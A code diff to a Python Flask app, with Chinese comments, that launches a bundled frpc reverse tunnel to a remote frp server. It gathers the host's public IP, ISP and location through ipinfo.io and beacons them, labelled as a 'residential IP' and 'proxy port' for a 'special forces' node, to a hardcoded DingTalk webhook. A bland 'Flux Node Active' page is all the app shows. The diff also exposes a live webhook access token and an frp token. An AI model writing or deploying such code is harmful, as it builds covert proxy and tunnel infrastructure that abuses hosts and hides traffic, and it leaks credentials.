@@ -2,7 +2,7 @@ import os
 import subprocess
 import random
 import time
-import requests  # 记得在 requirements.txt 加上 requests
+import requests
 from flask import Flask
 
 app = Flask(__name__)
@@ -16,31 +16,48 @@ CONFIG = {
     "TOKEN": "maxking2026",
     "REMOTE_PORT": str(random.randint(8600, 8800)),
     "PROXY_NAME": f"flux-python-{int(time.time())}",
-    "DING_URL": "你的钉钉机器人WEBHOOK_URL" # <--- 填入你的机器人地址
+    "DING_URL": "https://oapi.dingtalk.com/robot/send?access_token=fada04a2261f76607eea6d0203def79d8f0597ba03718e9a8edb2ee5b8ecf628" 
 }
 
 def send_ding(content):
+    """
+    发送钉钉通知，确保包含关键词 'A' 以绕过安全设置
+    """
     try:
-        data = {
+        # 严格遵守你之前的格式，带上 A 关键词
+        payload = {
             "msgtype": "text",
-            "text": {"content": f"【Flux资产上线】\n{content}"}
+            "text": {
+                "content": f"【A-Flux节点上线】\n\n🇺 目标达成！\n\n{content}"
+            }
         }
-        requests.post(CONFIG["DING_URL"], json=data, timeout=5)
+        headers = {"Content-Type": "application/json"}
+        r = requests.post(CONFIG["DING_URL"], json=payload, headers=headers, timeout=10)
+        print(f"[*] 钉钉汇报结果: {r.status_code}")
     except Exception as e:
-        print(f"钉钉发送失败: {e}")
+        print(f"[!] 钉钉发送失败: {e}")
 
 def deploy_soldier():
-    # 1. 侦察当前 IP 信息 (为了汇报得更详细)
+    print(f"[*] 正在初始化特种兵: {CONFIG['PROXY_NAME']}")
+    
+    # 1. 侦察环境 (获取 IP, ISP, 位置)
     try:
-        ip_info = requests.get("https://ipinfo.io/json", timeout=5).json()
-        target_ip = ip_info.get("ip", "Unknown")
-        isp = ip_info.get("org", "Unknown")
-        country = ip_info.get("country", "Unknown")
+        res = requests.get("https://ipinfo.io/json", timeout=10).json()
+        ip = res.get("ip", "Unknown")
+        org = res.get("org", "Unknown")
+        city = res.get("city", "Unknown")
+        country = res.get("country", "Unknown")
     except:
-        target_ip, isp, country = "Scan Failed", "N/A", "N/A"
+        ip, org, city, country = "获取失败", "Unknown", "Unknown", "Unknown"
 
-    # 2. 赋予执行权限并生成配置 (逻辑同前)
-    os.chmod("./frpc", 0o755)
+    # 2. 赋予执行权限
+    if os.path.exists("./frpc"):
+        os.chmod("./frpc", 0o755)
+    else:
+        print("[!] 错误：仓库中未找到 frpc 文件！")
+        return
+
+    # 3. 动态生成 TOML 配置
     toml_content = f"""
 serverAddr = "{CONFIG['SERVER_ADDR']}"
 serverPort = {CONFIG['SERVER_PORT']}
@@ -56,17 +73,24 @@ remotePort = {CONFIG['REMOTE_PORT']}
     with open("frpc.toml", "w") as f:
         f.write(toml_content)
     
-    # 3. 启动隧道
+    # 4. 异步启动 frpc
     subprocess.Popen(["./frpc", "-c", "./frpc.toml"])
 
-    # 4. 【核心】补上钉钉通知
-    report = f"📍 IP: {target_ip}\n🌐 ISP: {isp}\n🌍 国家: {country}\n🔗 端口: {CONFIG['REMOTE_PORT']}\n🆔 名称: {CONFIG['PROXY_NAME']}"
-    send_ding(report)
+    # 5. 按照你的标准格式发送通知
+    report_text = (
+        f"📍 位置: {city} | {org}\n\n"
+        f"🌐 住宅IP: {ip}\n\n"
+        f"🔗 代理端口: {CONFIG['REMOTE_PORT']}\n\n"
+        f"🆔 节点名称: {CONFIG['PROXY_NAME']}"
+    )
+    send_ding(report_text)
 
 @app.route('/')
 def index():
-    return f"<h1>Flux Node Active</h1><p>Running on {CONFIG['REMOTE_PORT']}</p>"
+    return "<h1>Flux Node Active</h1><p>A-Status: Running</p>"
 
 if __name__ == "__main__":
+    # 启动前先执行部署逻辑
     deploy_soldier()
+    # Flux 默认端口
     app.run(host='0.0.0.0', port=8080)
